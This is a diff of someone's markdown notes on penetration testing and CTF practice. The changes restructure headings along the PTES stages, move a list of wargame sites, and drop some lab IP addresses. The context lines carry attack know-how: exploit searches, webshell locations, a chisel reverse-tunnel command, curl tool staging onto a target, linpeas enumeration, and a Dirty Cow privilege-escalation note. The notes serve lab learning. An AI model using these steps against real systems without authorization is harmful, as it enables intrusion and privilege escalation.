@@ -10,31 +10,28 @@
 
 ---
 
-```sh
-# VM host:
-
-# kali server:
-10.10.14.69
-
-# vuln boxes:
-10.10.10.198
-```
-
 # toc
 
 <!-- vim-markdown-toc GFM -->
 
-	* [the pentest process](#the-pentest-process)
-		* [reporting](#reporting)
-	* [enumeration](#enumeration)
-		* [webapps](#webapps)
-	* [foothold and pivot](#foothold-and-pivot)
-		* [kali](#kali)
-		* [linux](#linux)
-		* [windows](#windows)
-	* [privilege escalation](#privilege-escalation)
-		* [linux](#linux-1)
-		* [windows](#windows-1)
+* [the pentest process](#the-pentest-process)
+	* [pre-engagement interactions](#pre-engagement-interactions)
+	* [information gathering](#information-gathering)
+	* [threat modeling](#threat-modeling)
+	* [vulnerability analysis](#vulnerability-analysis)
+	* [exploitation](#exploitation)
+	* [post-exploitation](#post-exploitation)
+	* [reporting](#reporting)
+* [CTF and wargame writeups](#ctf-and-wargame-writeups)
+* [enumeration](#enumeration)
+	* [webapps](#webapps)
+* [foothold and pivot](#foothold-and-pivot)
+	* [kali](#kali)
+	* [linux](#linux)
+	* [windows](#windows)
+* [privilege escalation](#privilege-escalation)
+	* [linux](#linux-1)
+	* [windows](#windows-1)
 * [bonus](#bonus)
 	* [oneliners](#oneliners)
 	* [kali config](#kali-config)
@@ -42,7 +39,6 @@
 	* [basics](#basics)
 		* [windows](#windows-2)
 		* [linux](#linux-2)
-* [CTF and wargame writeups](#ctf-and-wargame-writeups)
 * [tools](#tools)
 	* [find](#find)
 	* [less](#less)
@@ -56,31 +52,45 @@
 
 <!-- vim-markdown-toc -->
 
-## the pentest process
+# the pentest process
 
 This section follows the structure of the [Penetration Testing Execution Standard](http://www.pentest-standard.org/index.php/Main_Page) (PTES):
 
-1. pre-engagement interactions
-2. information gathering
-3. threat modeling
-4. vulnerability analysis
-5. exploitation
-6. post-exploitation
-7. reporting
+## pre-engagement interactions
 
-### reporting
+## information gathering
+
+## threat modeling
+
+## vulnerability analysis
+
+## exploitation
+
+## post-exploitation
+
+## reporting
 
 Documentation should start as soon as the pentenst starts to avoid situations
 where you need additional information but have already lost access to the target.
-
----
 
 Creating a mindmap is a good idea to get a clear but complete picture.
 
 * useful tools:
   * [Freemind](http://freemind.sourceforge.net/) allows for attaching files, such as port scans, to nodes
 
-## enumeration
+# CTF and wargame writeups
+
+* https://overthewire.org/ (linux)
+  * **[overthewire writeups](writeups/overthewire)** (in repo link)
+* https://underthewire.tech/ (powershell)
+* https://hackthebox.eu/
+  * **[hackthebox writeups](writeups/hackthebox)** (in repo link)
+* https://www.hacker101.com/
+* https://microcorruption.com/
+* http://smashthestack.org/
+* https://exploit-exercises.lains.space/ (mirror, original is down)
+
+# enumeration
 
 > port scanning
 
@@ -102,7 +112,7 @@ searchsploit motd # search exploits for message of the day.
 searchsploit -x 1235.c # look at specific exploit.
 ```
 
-### webapps
+## webapps
 
 * if it's a webapp/CMS/etc.:
   * `dirb` it
@@ -114,9 +124,9 @@ searchsploit -x 1235.c # look at specific exploit.
     * usually not automatically generated
   * try some vhosts by modifying the header with [Burp Suite](#burp-suite)
 
-## foothold and pivot
+# foothold and pivot
 
-### kali
+## kali
 
 * don't forget about:
   * `/usr/share/webshells`
@@ -150,7 +160,7 @@ chisel server -v -p 12345 --reverse
 # plink
 ```
 
-### linux
+## linux
 
 > information gathering
 
@@ -195,7 +205,7 @@ curl $h/file -so file
 ./linpeas.sh -a
 ```
 
-### windows
+## windows
 
 > information gathering
 
@@ -230,13 +240,13 @@ linpeas.exe
 linpeas.bat # if exe fails.
 ```
 
-## privilege escalation
+# privilege escalation
 
-### linux
+## linux
 
 * Kernel 2.6.22 to 4.8.3 Dirty Cow (`dirty.c`)
 
-### windows
+## windows
 
 # bonus
 ## oneliners
@@ -333,18 +343,6 @@ find . # get list of all files in dir.
 
 xdotool # fake keyboard mouse in X.
 ```
-
-# CTF and wargame writeups
-
-* https://overthewire.org/ (linux)
-  * **[overthewire writeups](writeups/overthewire)** (in repo link)
-* https://underthewire.tech/ (powershell)
-* https://hackthebox.eu/
-  * **[hackthebox writeups](writeups/hackthebox)** (in repo link)
-* https://www.hacker101.com/
-* https://microcorruption.com/
-* http://smashthestack.org/
-* https://exploit-exercises.lains.space/ (mirror, original is down)
 
 # tools
 
